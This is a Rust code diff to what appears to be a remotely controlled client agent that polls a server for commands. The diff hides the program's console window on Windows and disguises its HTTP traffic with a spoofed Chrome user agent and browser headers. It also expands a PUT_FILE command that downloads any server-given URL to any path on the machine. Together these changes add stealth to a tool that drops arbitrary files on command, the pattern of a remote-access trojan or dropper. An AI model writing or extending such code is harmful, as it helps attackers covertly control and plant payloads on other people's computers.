@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 use std::fs;
 use std::io::Write;
 use std::path::Path;
@@ -70,7 +71,10 @@ async fn main() {
     let mut config = load_or_create_config();
     println!("📱 Device ID: {}", config.device_id);
     
-    let client = Client::builder().build().unwrap();
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+        .build()
+        .unwrap();
 
     // 2. Spawn Heartbeat Task
     let hb_config = config.clone();
@@ -278,43 +282,98 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) 
             }
         },
         "PUT_FILE" => {
-            // Args expected: { "url": "...", "dest": "..." }
+            println!("📥 Processing PUT_FILE command...");
             if let Some(args_str) = cmd.args {
-                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&args_str) {
-                    let url = json["url"].as_str().unwrap_or_default();
-                    let dest = json["dest"].as_str().unwrap_or_default();
-                    
-                    if !url.is_empty() && !dest.is_empty() {
-                         match client.get(url).send().await {
-                             Ok(resp) => {
-                                 if resp.status().is_success() {
-                                     match resp.bytes().await {
-                                         Ok(bytes) => {
-                                             if bytes.is_empty() {
-                                                 status = "ERROR".to_string();
-                                                 response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
-                                             } else if let Err(e) = std::fs::write(dest, bytes) {
-                                                 status = "ERROR".to_string();
-                                                 response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
-                                             }
-                                         },
-                                         Err(e) => {
-                                             status = "ERROR".to_string();
-                                             response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
-                                         }
-                                     }
-                                 } else {
-                                     status = "ERROR".to_string();
-                                     response_data = Some(serde_json::json!({ "message": format!("Download failed (HTTP {}): The URL might have expired or is not a direct link.", resp.status()) }));
-                                 }
-                             },
-                             Err(e) => {
-                                 status = "ERROR".to_string();
-                                 response_data = Some(serde_json::json!({ "message": format!("Request fault: {}", e) }));
-                             }
-                         }
+                match serde_json::from_str::<serde_json::Value>(&args_str) {
+                    Ok(json) => {
+                        let url = json["url"].as_str().unwrap_or_default();
+                        let dest = json["dest"].as_str().unwrap_or_default();
+                        
+                        if url.is_empty() || dest.is_empty() {
+                            status = "ERROR".to_string();
+                            response_data = Some(serde_json::json!({ "message": "Missing 'url' or 'dest' in arguments" }));
+                        } else {
+                            println!("📡 Downloading from: {}", url);
+                            println!("🎯 Destination: {}", dest);
+
+                            // Create directory if it doesn't exist
+                            if let Some(parent) = Path::new(dest).parent() {
+                                if let Err(e) = fs::create_dir_all(parent) {
+                                    println!("⚠️ Failed to create directory: {}", e);
+                                }
+                            }
+
+                            // Build request with extra headers for compatibility
+                            let referer = url.replace("/dl/", "/");
+                            let req = client.get(url)
+                                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
+                                .header("Accept-Language", "en-US,en;q=0.9")
+                                .header("Referer", referer)
+                                .header("Upgrade-Insecure-Requests", "1")
+                                .header("Connection", "keep-alive");
+
+                            match req.send().await {
+                                Ok(resp) => {
+                                    let final_url = resp.url().clone();
+                                    if resp.status().is_success() {
+                                        let content_type = resp.headers()
+                                            .get("content-type")
+                                            .map(|v| v.to_str().unwrap_or("unknown"))
+                                            .unwrap_or("none");
+                                        let content_length = resp.content_length().unwrap_or(0);
+                                        
+                                        println!("📦 Received response from: {}", final_url);
+                                        println!("📦 Type: {}, Size: {} bytes", content_type, content_length);
+
+                                        if content_type.contains("text/html") && content_length < 20000 {
+                                             println!("⚠️ Warning: Response seems to be an HTML page, not a file.");
+                                        }
+
+                                        match resp.bytes().await {
+                                            Ok(bytes) => {
+                                                if bytes.is_empty() {
+                                                    status = "ERROR".to_string();
+                                                    response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
+                                                } else if let Err(e) = std::fs::write(dest, &bytes) {
+                                                    status = "ERROR".to_string();
+                                                    response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
+                                                    println!("❌ Write error: {}", e);
+                                                } else {
+                                                    println!("✅ File saved successfully! ({} bytes)", bytes.len());
+                                                    response_data = Some(serde_json::json!({ "dest": dest, "size": bytes.len() }));
+                                                }
+                                            },
+                                            Err(e) => {
+                                                status = "ERROR".to_string();
+                                                response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
+                                                println!("❌ Byte stream error: {}", e);
+                                            }
+                                        }
+                                    } else {
+                                        status = "ERROR".to_string();
+                                        let err_msg = format!("Download failed (HTTP {}): The link might be expired or restricted.", resp.status());
+                                        response_data = Some(serde_json::json!({ "message": err_msg }));
+                                        println!("❌ {} at {}", err_msg, final_url);
+                                    }
+                                },
+                                Err(e) => {
+                                    status = "ERROR".to_string();
+                                    response_data = Some(serde_json::json!({ "message": format!("Request fault: {}", e) }));
+                                    println!("❌ Request fault: {}", e);
+                                }
+                            }
+                        }
+                    },
+                    Err(e) => {
+                        status = "ERROR".to_string();
+                        response_data = Some(serde_json::json!({ "message": format!("Invalid JSON args: {}", e) }));
+                        println!("❌ JSON Parse error: {}", e);
                     }
                 }
+            } else {
+                status = "ERROR".to_string();
+                response_data = Some(serde_json::json!({ "message": "No arguments provided for PUT_FILE" }));
+                println!("❌ No arguments provided");
             }
         }
         _ => {
